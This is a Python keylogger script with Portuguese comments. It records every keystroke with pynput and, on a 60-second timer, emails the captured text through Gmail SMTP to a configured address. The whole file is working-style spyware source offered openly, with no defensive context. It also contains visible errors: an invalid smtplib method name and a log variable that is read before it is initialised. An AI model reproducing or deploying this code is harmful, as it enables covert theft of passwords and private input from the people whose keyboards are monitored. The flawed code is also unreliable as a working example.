from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#Configuração de e-mail

email_origem = "Seu email"
email_destino = "Seu email"
senha_email = "senha email"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo keylogger'
        msg['From'] = email_origem
        msg['To'] = email_destino
    
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email_origem, senha_email)
            server.sendmessage(msg)
            server.quit()
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

    log = ""

    #Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key): 
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+= " "
        elif key == keyboard.Key.enter:
            log+="\n"
        elif key == keyboard.Key.tab:
            log+="\t"
        elif key == keyboard.Key.backspace:
            log+="<"
        elif key == keyboard.Key.esc:
            log+=" [ESC] "
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()